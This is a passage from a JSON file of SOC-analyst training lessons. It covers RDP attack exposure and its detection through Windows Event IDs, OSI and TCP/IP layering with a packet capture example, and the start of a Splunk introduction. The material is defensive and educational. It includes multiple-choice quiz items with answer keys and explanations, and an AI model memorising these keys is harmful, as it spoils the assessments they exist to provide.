      "content": "If there is one practical security lesson about RDP, it is this: **RDP exposed to the internet is one of the most dangerous misconfigurations there is, and it is a leading entry point for ransomware.**\n\nWhy is it so dangerous? Because an internet-facing port 3389, protected only by a password, is a direct door into full desktop control of a Windows machine. Attackers know this, so they **continuously scan the entire internet for open port 3389** and then attack what they find. Two techniques dominate:\n\n- **Brute force and credential stuffing.** Attackers hammer exposed RDP with username/password guesses — millions of attempts across the internet daily. Weak or reused passwords fall quickly, and a successful login gives the attacker an interactive desktop session with the victim's privileges. A great many ransomware incidents begin exactly this way: brute-forced or purchased RDP credentials.\n- **Exploits — BlueKeep.** RDP has had serious vulnerabilities, most famously **BlueKeep (CVE-2019-0708)**, a 'wormable' flaw that allowed remote code execution against unpatched systems without any credentials. This is why patching RDP and restricting its exposure is critical.\n\nOnce inside via RDP, an attacker has a strong foothold: a real desktop session from which to disable defences, steal credentials, move laterally (including via RDP to other internal machines), and ultimately deploy ransomware across the environment.\n\n**The defensive lessons** follow directly:\n\n- **Never expose RDP directly to the internet.** Put it behind a **VPN**, a bastion/jump host, or a Remote Desktop Gateway, so port 3389 is not reachable from anywhere.\n- **Enforce NLA and strong authentication, ideally MFA**, so a guessed password alone is not enough.\n- **Patch RDP** to close known vulnerabilities like BlueKeep.\n- **Lock out and alert** on repeated failed logons.\n\nUnderstanding that exposed RDP + weak authentication = ransomware's favourite front door is one of the most operationally valuable things an analyst can know."
    },
    {
      "heading": "RDP Session Features: Shadowing, Redirection, and the Gateway",
      "content": "RDP includes several additional capabilities beyond simply showing a remote desktop, and each has its own security relevance worth knowing.\n\n**Session shadowing** lets one RDP user view or even control *another* active RDP session on the same machine — a legitimate feature for IT support to watch a user's screen and help them remotely. It is powerful and, like SMB's admin shares, a feature that is entirely appropriate in the hands of a real administrator and a red flag if used unexpectedly: an attacker who has compromised an account with the right privileges can use shadowing to silently observe or hijack another logged-in user's session without ever needing that user's own credentials.\n\n**Drive and clipboard redirection** let a connecting client share its local drives and clipboard with the remote session, so files can be dragged between the two and copy-paste works across the connection. Convenient for administrators, but it also means an attacker with RDP access to a compromised machine can use redirection to pull files off it directly through the RDP session itself — an exfiltration path that does not touch the network the way an FTP or HTTP upload would, and can be missed by controls watching only for those channels.\n\nThe **Remote Desktop Gateway (RD Gateway)** is the recommended way to expose RDP access without putting port 3389 directly on the internet, mentioned earlier as a defense. It works by wrapping RDP traffic inside HTTPS (port 443), so external users connect to the Gateway over a standard, inspectable web connection, authenticate, and only then does the Gateway relay them internally to the actual target machine's RDP port — meaning 3389 itself is never reachable from outside the network at all. This is the concrete implementation of the 'put RDP behind something' guidance from the previous section, and its presence (or absence) is a meaningful architectural fact for a SOC assessing an organisation's exposure.\n\nFor an analyst, the shared lesson across all three features is the same one that ran through SMB's admin shares: **RDP's most powerful capabilities — shadowing, redirection, gateway-mediated access — are legitimate and necessary for administration, and precisely because of that, their misuse blends in with normal traffic** unless you know what to look for and can compare it against who is supposed to be using these features, and how."
    },
    {
      "heading": "Why RDP Matters to a SOC Analyst",
      "content": "Because RDP is both a critical admin tool and a top intrusion vector, RDP activity is high-value data the SOC watches closely — and it maps to specific, recognisable log patterns.\n\n**What analysts hunt for:**\n\n- **RDP brute force.** A flood of **failed logon attempts** against RDP — in Windows logs, many **Event ID 4625** (failed logon) entries, often with logon type **10** (RemoteInteractive) or **3**, from one or many sources — indicates password guessing. A brute force that then **succeeds** (a **4624** successful logon of type 10 after many 4625s) is a likely compromise demanding immediate investigation.\n- **Internet-exposed 3389.** Discovering that port 3389 is reachable from the internet is a critical finding in itself; analysts and vulnerability scans flag exposed RDP as a priority to close.\n- **Successful RDP logons from unusual sources.** A RemoteInteractive logon from an unfamiliar country, at an odd hour, or to a server that is not normally administered that way, can signal stolen credentials — even if the login 'succeeded,' the *context* is the red flag.\n- **Lateral movement via RDP.** Attackers use RDP to hop between internal machines. One internal host initiating RDP to many others, or RDP sessions between machines that normally never connect, is a lateral-movement signal.\n- **Related indicators** — new local accounts created after an RDP logon, defences disabled during an RDP session, or RDP connections immediately preceding ransomware activity.\n\n**Where the data comes from:** Windows **Security event logs** (4624/4625 with logon type 10), **Remote Desktop / Terminal Services operational logs** (which record session connect/disconnect and the source), and **firewall/network logs** (connections on port 3389, especially inbound from the internet).\n\nThe analyst mindset is that **an RDP logon is a high-stakes event** — someone taking interactive control of a Windows desktop — so RDP authentication deserves priority attention. Baseline who normally uses RDP, to which machines, from where; then alert on the deviations: the brute force, the successful login after many failures, the foreign source, the internal fan-out. Combined with the hard rule that RDP should never face the internet unprotected, this makes RDP monitoring one of the most impactful things a SOC does to stop ransomware before it starts."
    },
    {
      "heading": "A Worked Example: Reading RDP Brute-Force in Windows Event Logs",
      "content": "A Windows server's Security event log shows the following excerpt (fields simplified for readability):\n\n```\n01:55:02 EventID=4625 LogonType=10 Account=Administrator SourceIP=198.51.100.201\n01:55:04 EventID=4625 LogonType=10 Account=Administrator SourceIP=198.51.100.201\n01:55:06 EventID=4625 LogonType=10 Account=admin SourceIP=198.51.100.201\n... (218 more 4625 events over 40 minutes, same source) ...\n02:36:41 EventID=4624 LogonType=10 Account=Administrator SourceIP=198.51.100.201\n02:36:41 EventID=4688 NewProcess=cmd.exe ParentProcess=explorer.exe Account=Administrator\n```\n\nWalking through it: repeated **4625** events (failed logon) with **LogonType=10** — recall from this lesson that logon type 10 specifically means RemoteInteractive, i.e. RDP — show an automated tool cycling through account names (`Administrator`, `admin`, and presumably others) against one server from `198.51.100.201` for forty minutes. Then a **4624** (successful logon), still type 10, still from the same source, shows the guessing eventually worked against the built-in `Administrator` account. Immediately after, a **4688** (a new process was created) shows `cmd.exe` launching from `explorer.exe` — exactly what a real interactive desktop session looks like when someone opens a command prompt, confirming the attacker is now actively working inside the machine, not merely logged in and idle.\n\n**The questions this sequence demands:** is `198.51.100.201` external or internal — if external, this server has RDP reachable from the internet and needs to be pulled behind a VPN/Gateway immediately, independent of this specific incident. Is `Administrator` the *actual* built-in account, and was it ever supposed to be usable for interactive RDP logon (best practice disables direct RDP for built-in admin accounts)? What did that `cmd.exe` session do next — check subsequent 4688 events for signs of credential dumping, disabling of security tools, or staging for ransomware, since this is precisely the entry-point moment the earlier section described as ransomware's favourite door.\n\nThis log excerpt is the RDP-specific version of the SSH auth-log example earlier in this course: volume of failures, a single success, and the same source — the pattern repeats across protocols because brute force is fundamentally the same technique everywhere, and recognising its signature is a transferable skill, not a one-protocol trick."
    }
  ],
  "keyTakeaways": [
    "RDP (Remote Desktop Protocol) is Microsoft's protocol for controlling the full graphical desktop of a Windows machine over TCP port 3389 — where SSH gives a text shell (mostly Linux), RDP gives an interactive Windows desktop with the user's privileges.",
    "An RDP session negotiates encryption, authenticates with Windows credentials (ideally protected by Network Level Authentication / NLA and MFA), then streams the desktop to the client while sending input back; its safety hinges on whether port 3389 is exposed and whether strong authentication is enforced.",
    "RDP exposed to the internet is a leading ransomware entry point: attackers constantly scan for open 3389 and use brute force / credential stuffing (and exploits like BlueKeep, CVE-2019-0708); defend by never exposing RDP directly (use a VPN/jump host/RD Gateway), enforcing NLA + MFA, and patching.",
    "SOC analysts hunt RDP brute force (many Event ID 4625 failed logons, logon type 10, and a 4624 success after them = likely compromise), internet-exposed 3389, successful logons from unusual sources, and RDP-based lateral movement — using Windows Security logs, Terminal Services logs, and firewall data on port 3389.",
    "RDP's advanced features — session shadowing (viewing/controlling another session), drive/clipboard redirection, and the RD Gateway (wrapping RDP in HTTPS so port 3389 is never internet-facing) — are legitimate admin tools that also create exfiltration and hijacking paths when misused, so their use should be compared against who is authorised."
  ],
  "quiz": [
    {
      "question": "In Windows Security logs on an internet-reachable server you find hundreds of Event ID 4625 (failed logon) entries with logon type 10 from many IPs, followed by one Event ID 4624 (successful logon) type 10 from a foreign IP. What does this indicate and why does it matter?",
      "options": [
        {
          "label": "A normal software update, because Windows Update authenticates by generating hundreds of failed RemoteInteractive logons before one succeeds from an overseas server.",
          "value": "a"
        },
        {
          "label": "A successful RDP brute-force: many failed remote logons then a success (type 10) signals an attacker gained an interactive desktop session — a likely compromise and common ransomware entry.",
          "value": "b"
        },
        {
          "label": "A DNS cache error, because failed and successful RemoteInteractive logon events are the standard way Windows records name-resolution problems on a server.",
          "value": "c"
        },
        {
          "label": "Nothing important, because logon type 10 events are informational only and never indicate remote access or any kind of attacker activity on the machine.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Logon type 10 is RemoteInteractive (RDP); many 4625 failures followed by a 4624 success from a foreign IP is the signature of a successful RDP brute-force, giving the attacker an interactive desktop session — a likely compromise and one of the most common ransomware entry points, demanding immediate investigation. Option a invents update behaviour. Option c misattributes logon events to DNS. Option d wrongly dismisses type-10 logons, which specifically indicate remote desktop access."
    },
    {
      "question": "A vulnerability scan reports that a Windows server has TCP port 3389 open to the entire internet. Why is this considered a critical finding, and what is the correct remediation?",
      "options": [
        {
          "label": "It is minor, because port 3389 only allows read-only screen viewing and can never give an attacker interactive control or a path to deploy ransomware.",
          "value": "a"
        },
        {
          "label": "Exposed RDP is a top ransomware entry point via brute force and exploits like BlueKeep; put RDP behind a VPN/jump host, enforce NLA + MFA, and patch.",
          "value": "b"
        },
        {
          "label": "It is expected, because best practice is to expose RDP directly to the internet so administrators worldwide can always reach the server without a VPN.",
          "value": "c"
        },
        {
          "label": "The fix is simply to change the RDP password monthly, since an internet-exposed 3389 poses no risk as long as the password is rotated on a schedule.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "An internet-exposed port 3389 is a critical finding because attackers constantly scan for open RDP and break in via brute force/credential stuffing or exploits like BlueKeep, making it a leading ransomware entry point; the correct remediation is to remove direct exposure (VPN, jump host, or RD Gateway), enforce NLA and MFA, and patch. Option a wrongly claims RDP is read-only. Option c states the opposite of best practice. Option d is insufficient because exposure itself — not just password age — is the core risk."
    },
    {
      "question": "An organisation wants remote workers to reach internal RDP servers without ever exposing port 3389 to the internet. Which architecture achieves this, and how does it work?",
      "options": [
        {
          "label": "A Remote Desktop Gateway, which wraps RDP traffic inside HTTPS on port 443 so external users authenticate to the Gateway before it relays them internally.",
          "value": "a"
        },
        {
          "label": "Session shadowing, which lets one administrator silently view another user's desktop and therefore removes the need for any external RDP connection entirely.",
          "value": "b"
        },
        {
          "label": "Clipboard redirection, which copies files between the client and server directly and therefore makes opening port 3389 externally completely unnecessary.",
          "value": "c"
        },
        {
          "label": "Anonymous FTP access, which allows remote workers to upload their desktop session as a file instead of connecting through the RDP protocol at all.",
          "value": "d"
        }
      ],
      "answer": "a",
      "explanation": "A Remote Desktop Gateway wraps RDP traffic inside HTTPS on port 443, so external users connect to and authenticate against the Gateway over a standard web connection, which then relays them internally to the target machine's RDP port — meaning 3389 itself is never exposed to the internet. Option b describes shadowing, a within-session viewing feature unrelated to external exposure. Option c describes clipboard redirection, a file-sharing convenience, not an access architecture. Option d invents an irrelevant FTP-based mechanism that has nothing to do with RDP."
    }
  ],
  "references": [
    "https://learn.microsoft.com/en-us/windows-server/remote/remote-desktop-services/clients/remote-desktop-protocol",
    "https://attack.mitre.org/techniques/T1021/001/",
    "https://learn.microsoft.com/en-us/security-updates/securitybulletins/2019/cve-2019-0708"
  ],
  "xp": 240,
  "estimatedMinutes": 48,
  "researchUsed": false,
  "createdAt": "2026-08-15T00:00:00.000Z"
},
{
  "id": "topic-lesson-osi-vs-tcp-ip",
  "slug": "osi-model-vs-tcp-ip-explained",
  "title": "The OSI Model vs TCP/IP: How Networking Is Layered",
  "topic": "Networking Fundamentals",
  "difficulty": "beginner",
  "kind": "lesson",
  "intro": "Networking looks impossibly complex until you see the one idea that organises all of it: layers. The OSI model and the TCP/IP model are two ways of dividing network communication into stacked layers, each doing one job and handing off to the next. This focused lesson explains both models from scratch: why layering exists, what each of the OSI model's seven layers does, how the four-layer TCP/IP model maps onto it and why TCP/IP is what the internet actually runs on, and how thinking in layers gives a SOC analyst a mental map for every protocol, attack, and log source.",
  "sections": [
    {
      "heading": "Why Networking Is Built in Layers",
      "content": "Getting data from one computer to another across the world involves an enormous amount of work: turning information into signals on a wire or radio, addressing it, routing it across many networks, making sure nothing is lost, and finally presenting it as a web page or email. Trying to think about all of that at once is overwhelming. The solution, and the single most important idea in networking, is to **divide the work into layers**, where each layer handles one specific job and relies on the layer below it.\n\nThe real-life analogy is **sending a letter through the postal system**. You write the letter (the content) and put it in an envelope with an address. You do not personally drive it across the country — you hand it to the post office, which sorts it, passes it to transport, which moves it, and so on. Each stage does its own job and trusts the others to do theirs. You never think about the trucks; the trucks never read your letter. Networking works the same way: each layer wraps the data with the information its job needs and hands it down, and on the other side each layer unwraps its part and hands it up.\n\nThis wrapping is called **encapsulation**. As data moves down the layers to be sent, each layer adds its own **header** (its addressing and control information) around the data from the layer above — like putting a letter in an envelope, then the envelope in a mailbag, then the mailbag on a truck. On the receiving side, each layer removes its header and passes the rest up. The names change as it goes: at the transport layer it is a **segment**, at the network layer a **packet**, at the data-link layer a **frame**, and on the wire, **bits**.\n\nLayering brings two big benefits. **Modularity** — each layer can change independently (Wi-Fi replaced Ethernet cables without rewriting the web). And **a shared vocabulary** — engineers and analysts can say 'that is a Layer 3 problem' or 'a Layer 7 attack' and be precisely understood. Two standard layer models exist, OSI and TCP/IP, and the rest of this lesson explains both."
    },
    {
      "heading": "The Seven Layers of the OSI Model",
      "content": "The **OSI model** — **Open Systems Interconnection** — is a **conceptual reference model**, created by the ISO standards body, that divides networking into **seven layers**. It is not the exact system the internet runs on (that is TCP/IP, next section), but it is the universal teaching and troubleshooting framework, and its layer numbers are used everywhere in security.\n\nFrom the bottom up:\n\n- **Layer 1 — Physical.** The actual transmission of raw **bits** as signals: cables, radio waves, voltages, fibre light. Example: Ethernet cabling, Wi-Fi radio.\n- **Layer 2 — Data Link.** Moves data between two directly-connected devices on the same local network, using hardware **MAC addresses**, packaged as **frames**. Example: Ethernet switches, the MAC address on your network card.\n- **Layer 3 — Network.** Handles **addressing and routing** across different networks — getting a **packet** from any network to any other. This is where **IP addresses** live. Example: IP, routers.\n- **Layer 4 — Transport.** Manages end-to-end delivery between programs, including reliability and **ports**. This is **TCP** (reliable, ordered) and **UDP** (fast, no guarantee). Example: TCP port 443, UDP port 53.\n- **Layer 5 — Session.** Establishes, manages, and ends **sessions** (ongoing conversations) between applications.\n- **Layer 6 — Presentation.** Handles **data format, encryption, and encoding** — translating data into a form the application understands. Example: TLS encryption, character encoding.\n- **Layer 7 — Application.** The layer closest to the user, where the actual applications and their protocols live. Example: HTTP, DNS, SMTP, SSH — the protocols from the other lessons.\n\nA classic mnemonic for Layers 1-7 is 'Please Do Not Throw Sausage Pizza Away' (Physical, Data Link, Network, Transport, Session, Presentation, Application).\n\nThe key thing to absorb is *what each layer is responsible for*, because it lets you place any technology precisely: a MAC address is Layer 2, an IP address is Layer 3, a port is Layer 4, and a web request is Layer 7. That placement, as the final section shows, is exactly how an analyst reasons about where an attack or a control operates."
    },
    {
      "heading": "The TCP/IP Model and How It Maps to OSI",
      "content": "While OSI is the seven-layer *teaching* model, the internet actually runs on the **TCP/IP model** — a more practical framework with **four layers**, named after its two most important protocols (TCP and IP). Understanding both, and how they line up, is what lets you move between the theory everyone teaches and the reality everything runs on.\n\nThe **four TCP/IP layers**, bottom up:\n\n- **Link (Network Access)** — physically getting data onto the local network. Combines OSI Layers 1-2.\n- **Internet** — addressing and routing across networks with **IP**. Maps to OSI Layer 3.\n- **Transport** — end-to-end delivery with **TCP/UDP** and ports. Maps to OSI Layer 4.\n- **Application** — the protocols applications use (HTTP, DNS, SMTP, SSH). Combines OSI Layers 5-7.\n\nHere is the mapping side by side:\n\n| TCP/IP layer | OSI layer(s) | Examples |\n|--------------|--------------|----------|\n| Application | 5 Session + 6 Presentation + 7 Application | HTTP, DNS, SMTP, SSH, TLS |\n| Transport | 4 Transport | TCP, UDP (ports) |\n| Internet | 3 Network | IP, routing |\n| Link | 1 Physical + 2 Data Link | Ethernet, Wi-Fi, MAC |\n\n**The core differences:**\n\n- **Number of layers.** OSI has 7; TCP/IP has 4. TCP/IP bundles OSI's top three (Session, Presentation, Application) into one Application layer, and OSI's bottom two into one Link layer.\n- **Purpose.** OSI is a *conceptual reference model* — a standard for teaching, designing, and troubleshooting. TCP/IP is a *practical, implemented model* — the actual protocol suite the internet was built on and uses.\n- **Which came to dominate.** TCP/IP won in practice because it was implemented and deployed first and worked; OSI won in the classroom as the clearer conceptual map.\n\nThe practical reconciliation analysts use every day: **speak in OSI layer numbers, but know the internet runs on TCP/IP.** When someone says 'a Layer 7 firewall' or 'a Layer 3 route,' they are using OSI numbers to describe TCP/IP reality. Both models describe the same journey of data; OSI just slices it into finer conceptual pieces. Being fluent in both — and in how they map — is basic networking literacy for a SOC."
    },
    {
      "heading": "Layers in a Packet Capture: Seeing the Model in One Packet",
      "content": "The layer model is not just a diagram — you can see it directly in one captured packet, because encapsulation means every layer's header is literally sitting inside the data of the layer below it, nested like a set of envelopes. A tool like Wireshark displays exactly this nesting when you expand a single frame.\n\nHere is a simplified view of one HTTP request as it actually appears on the wire, from the outside in:\n\n```\nFrame: 74 bytes on wire\n Ethernet II: Src MAC aa:bb:cc:00:11:22, Dst MAC 00:11:22:aa:bb:cc\n Internet Protocol: Src 10.14.22.108, Dst 93.184.216.34\n Transmission Control Protocol: Src Port 51422, Dst Port 80\n Hypertext Transfer Protocol: GET /index.html HTTP/1.1\n```\n\nRead from the outside in, each line is one layer's contribution, and each is precisely the field this lesson already assigned to that layer: the **Ethernet** header carries the **MAC addresses** (Layer 2 — the local hop); inside that, the **IP** header carries the **source and destination IP addresses** (Layer 3 — the end-to-end route); inside that, the **TCP** header carries the **port numbers** (Layer 4 — which program on each end); and inside all of that, sitting as the innermost payload, is the actual **HTTP request** (Layer 7 — what the user or application actually wanted).\n\nThis nesting is also why different tools and log sources genuinely see different amounts of the same event: a **firewall** typically looks only as deep as the IP and TCP headers — enough to allow or block by address and port — without ever unwrapping the HTTP layer inside. A **web server log** or a **WAF**, by contrast, is specifically built to unwrap all the way to Layer 7 and record the request itself. Neither is 'better'; they are simply positioned to see different depths of the same nested structure, which is exactly why the earlier section described defense in depth as placing controls at multiple layers — each control is, quite literally, looking at a different envelope in the same stack.\n\nOnce you can look at a raw packet capture and mentally label each section — this part is Layer 2, this part Layer 3, this part Layer 4, this part Layer 7 — the layer model stops being an abstract diagram and becomes a direct reading skill applicable to every packet you will ever examine."
    },
    {
      "heading": "Why Layered Thinking Matters to a SOC Analyst",
      "content": "Layer models are not just theory for an analyst — they are a **mental map** that organises every protocol, attack, control, and log source into a coherent picture. Once you think in layers, security stops being a jumble of technologies and becomes a structured stack.\n\n### Layers place every protocol you have learned\n\nThe other lessons snap directly onto the model: MAC addresses and switches are **Layer 2**; IP addresses, routing, and firewalls filtering by IP are **Layer 3**; TCP/UDP and port-based filtering are **Layer 4**; and HTTP, DNS, SMTP, SSH, and RDP are **Layer 7**. When you see a protocol, knowing its layer tells you immediately what it does and what talks to it.\n\n### Layers classify attacks and controls\n\nSecurity operates at every layer, and naming the layer sharpens your thinking:\n\n- **Layer 3/4 attacks and defences** — IP-based attacks, port scanning, and network firewalls that allow/deny by IP and port operate down here. A volumetric DDoS is often a Layer 3/4 flood.\n- **Layer 7 attacks and defences** — SQL injection, XSS, and application-layer exploits live at Layer 7, which is why you need a **Layer 7 (application) firewall / WAF** to inspect the actual HTTP content, not just IPs and ports. A 'Layer 7 DDoS' targets the application itself.\n- **Defense in depth** — good security places controls at *multiple* layers (network firewall at 3/4, WAF at 7, encryption at 6, endpoint controls above), so a failure at one layer is caught at another.\n\n### Layers map your telemetry\n\nDifferent log sources see different layers: firewall and flow logs mostly show Layer 3/4 (IPs, ports, bytes); a packet capture lets you drill from Layer 2 up to Layer 7; web and application logs show Layer 7 detail. Knowing which layer a data source sees tells you what questions it can answer — and where you have blind spots.\n\n### Layers guide troubleshooting and investigation\n\nThe classic method is to reason layer by layer: is this a physical/link problem, a routing (Layer 3) problem, a port/transport (Layer 4) problem, or an application (Layer 7) problem? The same discipline helps in an investigation — locating where in the stack an attack is operating focuses your response.\n\nThe overarching payoff is that **the layer model turns networking and security into a map you can navigate.** When an alert arrives, silently asking 'which layer is this?' immediately narrows what is happening, which tools see it, and what control should have caught it. That structured, layered instinct — built on knowing OSI's seven layers, TCP/IP's four, and how they map — is one of the most quietly powerful thinking tools a SOC analyst has."
    },
    {
      "heading": "A Layered Investigation Checklist",
      "content": "The classic networking discipline of troubleshooting **bottom-up through the layers** translates directly into a structured way an analyst can approach a confusing incident, asking one layer-specific question at a time instead of guessing at random.\n\n**Layer 1/2 questions** — Is the physical connection or local link actually up? Is the device on the network at all (does it have a link light, does its MAC address show up on the switch)? These questions rarely apply to a security investigation directly, but they matter when 'is this system even reachable' is itself in doubt.\n\n**Layer 3 questions** — Does the device have a valid IP address and route (this is where the DHCP lesson connects directly — a lease log answers exactly this)? Is a firewall or router blocking the path by IP? Is traffic being routed somewhere unexpected?\n\n**Layer 4 questions** — Is the expected port open and listening? Is a firewall blocking by port rather than by IP? Is this TCP (reliable, connection-based, used by HTTP/SSH/SMB/RDP/FTP-control) or UDP (fast, connectionless, used by DHCP/DNS)? Knowing which protocol a service uses at this layer tells you which kind of log and which kind of filtering rule applies.\n\n**Layer 7 questions** — the ones that dominate most SOC work: what did the application actually say? What method, what command, what content? This is where nearly every specific protocol lesson in this course — HTTP's methods and status codes, SMTP's headers and authentication results, SSH's authentication method, RDP's logon type — supplies the real detail, because Layer 7 is where intent lives.\n\nPutting it together as a single mental checklist for any confusing event: **first place it in the stack** (is this about physical connectivity, addressing, ports, or application content?), **then pick the tool and log source that actually sees that layer** (a firewall log for Layer 3/4 questions, an application or endpoint log for Layer 7 questions), **then ask the layer-appropriate question** rather than a vague one. An alert that says 'blocked connection' is a Layer 3/4 fact; an alert that says 'SQL injection attempt' is a Layer 7 fact — and knowing the difference, instantly, is what turns the seven-layer diagram from something memorised for a quiz into a working diagnostic habit you reach for on every single incident."
    }
  ],
  "keyTakeaways": [
    "Networking is divided into layers so each handles one job and hands off to the next; data is encapsulated (each layer wraps the layer above with its own header) and named per layer — segment (transport), packet (network), frame (data link), bits (physical).",
    "The OSI model is a 7-layer conceptual reference: 1 Physical, 2 Data Link (MAC/frames), 3 Network (IP/routing/packets), 4 Transport (TCP/UDP/ports), 5 Session, 6 Presentation (encryption/encoding), 7 Application (HTTP/DNS/SMTP/SSH).",
    "The TCP/IP model is the practical 4-layer model the internet runs on — Link (=OSI 1-2), Internet (=OSI 3, IP), Transport (=OSI 4, TCP/UDP), Application (=OSI 5-7); OSI is the teaching/troubleshooting map, TCP/IP is the implemented reality, and analysts speak in OSI layer numbers about TCP/IP.",
    "Layered thinking is an analyst's mental map: it places every protocol by layer (MAC=L2, IP=L3, ports=L4, HTTP/DNS=L7), classifies attacks and controls (network firewall at L3/4 vs WAF at L7), maps which telemetry sees which layer, and structures troubleshooting and defense in depth.",
    "Encapsulation is visible directly in a packet capture — Ethernet (L2/MAC) wraps IP (L3/addresses) wraps TCP (L4/ports) wraps the application payload (L7) — which is why different tools see different depths, and troubleshooting/investigation both work best asked layer by layer, from physical/addressing up to application content."
  ],
  "quiz": [
    {
      "question": "An analyst says a web application firewall (WAF) is needed because a network firewall that filters only by IP address and port cannot stop a SQL injection attack. Using the layer model, why is this correct?",
      "options": [
        {
          "label": "SQL injection is a Layer 1 physical-cabling attack, so only a WAF that inspects electrical signals on the wire can detect and block it.",
          "value": "a"
        },
        {
          "label": "A network firewall works at Layer 3/4 (IP and port), but SQL injection is a Layer 7 application attack hidden in HTTP content that only a Layer 7 WAF can inspect.",
          "value": "b"
        },
        {
          "label": "SQL injection operates at Layer 4 (ports), so the network firewall already blocks it and the WAF is redundant and provides no additional protection.",
          "value": "c"
        },
        {
          "label": "A WAF and a network firewall both operate only at Layer 3, so they are interchangeable and either one alone fully stops SQL injection attacks.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "A network firewall operates at Layer 3/4, allowing or denying by IP address and port, so it cannot see the malicious payload inside an HTTP request; SQL injection is a Layer 7 (application) attack, so you need a Layer 7 WAF that inspects the actual application content. Option a wrongly places SQL injection at the physical layer. Option c incorrectly claims a port-based firewall stops an application-layer attack. Option d is wrong because a WAF operates at Layer 7, not Layer 3, and they are not interchangeable."
    },
    {
      "question": "What is the most accurate description of the relationship between the OSI model and the TCP/IP model?",
      "options": [
        {
          "label": "They are competing protocols, and a network must be configured to use either OSI or TCP/IP but can never use concepts from both at the same time.",
          "value": "a"
        },
        {
          "label": "OSI is a 7-layer conceptual reference model for teaching/troubleshooting, while TCP/IP is the practical 4-layer model the internet actually runs on; their layers map onto each other.",
          "value": "b"
        },
        {
          "label": "TCP/IP has seven layers and OSI has four, and TCP/IP is only a teaching model while OSI is the protocol suite that the modern internet is actually built on.",
          "value": "c"
        },
        {
          "label": "They are identical in every respect, with the same number of layers and the same names, so the two terms are fully interchangeable with no differences at all.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "OSI is a 7-layer conceptual reference model used for teaching and troubleshooting, while TCP/IP is the practical 4-layer model actually implemented and run by the internet; their layers map onto each other (TCP/IP Application = OSI 5-7, Link = OSI 1-2). Option a is wrong because OSI is a model, not a competing protocol you choose instead of TCP/IP. Option c reverses their layer counts and roles. Option d is false because they differ in layer count and purpose."
    },
    {
      "question": "A firewall log shows a connection was 'allowed' to an internal web server, yet the attack actually succeeded through a malicious parameter hidden inside the HTTP request itself. Why did the firewall log show 'allowed' rather than catching the attack?",
      "options": [
        {
          "label": "Firewalls typically inspect only up to Layer 3/4 (IP address and port), so they permit the connection without ever unwrapping the Layer 7 HTTP content.",
          "value": "a"
        },
        {
          "label": "The firewall log is corrupted, because a properly functioning firewall always inspects every layer, including the full HTTP request body, by default.",
          "value": "b"
        },
        {
          "label": "Layer 7 attacks cannot travel over TCP connections, so the firewall correctly allowed the traffic since no attack could exist inside it at all.",
          "value": "c"
        },
        {
          "label": "The web server's MAC address was spoofed at Layer 2, which is the only way an HTTP-based attack could ever bypass a network firewall's inspection.",
          "value": "d"
        }
      ],
      "answer": "a",
      "explanation": "A typical network firewall makes its allow/deny decision at Layer 3/4 — source/destination IP and port — without unwrapping the Layer 7 application payload, so a connection can be legitimately 'allowed' at that layer while still carrying a malicious HTTP request inside; catching that requires a Layer 7 tool like a WAF. Option b is wrong because this is normal firewall behaviour, not corruption. Option c is false since Layer 7 attacks (like SQL injection) travel inside ordinary TCP connections constantly. Option d invents an unrelated Layer 2 MAC-spoofing explanation."
    }
  ],
  "references": [
    "https://www.cloudflare.com/learning/ddos/glossary/open-systems-interconnection-model-osi/",
    "https://www.rfc-editor.org/rfc/rfc1122",
    "https://developer.mozilla.org/en-US/docs/Web/HTTP/Overview"
  ],
  "xp": 220,
  "estimatedMinutes": 46,
  "researchUsed": false,
  "createdAt": "2026-08-15T00:00:00.000Z"
},
{
  "id": "topic-lesson-splunk-for-soc-analysts",
  "slug": "splunk-for-soc-analysts",
  "title": "Splunk for SOC Analysts: Searching, SPL, and Notable Events",
  "topic": "SIEM",
  "difficulty": "intermediate",
  "kind": "lesson",
  "intro": "Splunk is one of the most widely deployed SIEMs in the world, and for a huge number of SOC analysts it is the single tool they live in all day. This lesson assumes you have never touched Splunk — or any SIEM — before. We start from the very beginning: what a log is, what a SIEM does, and what problem Splunk solves. Then we learn, step by step and defining every term as we go, how to actually search: where data lives, how the search bar works, what a 'field' is, how the SPL pipe chains commands together, the dozen commands you will use every shift, real SOC searches you can read line by line, and how a search becomes an automatic alert or a Notable Event. By the end you should be able to open Splunk and answer a real question.",
  "sections": [
    {
      "heading": "Start Here: What a Log, an Event, and a SIEM Actually Are",
      "content": "Before Splunk makes any sense, three plain-English ideas have to be solid. If you already know them, this section is a quick warm-up; if you don't, everything else depends on it, so take your time here.\n\n### What is a log?\n\nEvery computer, phone, server, firewall, and app constantly writes down what it is doing, into text records called **logs**. When you sign in to your laptop, Windows writes a line saying *who* signed in, *when*, and *from where*. When a firewall blocks a connection, it writes a line saying *what* it blocked. A log is simply a **diary the machine keeps of its own activity** — not for you to read for fun, but so that when something goes wrong, there is a record of what happened.\n\n### What is an event?\n\nOne single line in that diary — one thing that happened — is called an **event**. \"User d.rosen signed in at 09:14 from 10.14.22.108\" is one event. \"Firewall blocked 10.0.0.5 → 203.0.113.9 on port 443\" is another event. A busy company produces *millions* of events every day across all its machines. Each event is a small, factual record: who, what, when, where.\n\n### What is a SIEM, and why does a SOC need one?\n\nHere is the problem. Those millions of events are scattered across thousands of different machines, each writing its own diary in its own format, in its own place. If an attacker signs in to one laptop and then reaches a server, the evidence is split across two different diaries on two different machines. No human could log into every device to piece that together.\n\nA **SIEM** — which stands for **Security Information and Event Management** — solves this. It is a system that **collects all those logs from everywhere into one central place**, stores them, and lets you search across all of them at once. Think of it as taking every machine's separate diary and copying every page into one giant, searchable library. Now, instead of visiting a thousand machines, an analyst asks one question in one place and sees events from all of them together.\n\n**Splunk is a SIEM** (among other things). That is the entire reason a SOC uses it: it is the one place where all the logs land, and the one search box where an analyst can ask questions of everything at once. Everything else in this lesson — indexes, fields, SPL — is just *how you ask those questions*. Keep this picture in your head: millions of little diary lines (events), from everywhere, gathered into one searchable pile, and you are learning to search that pile."
    },
    {
      "heading": "What Splunk Is and Why Analysts Live In It",
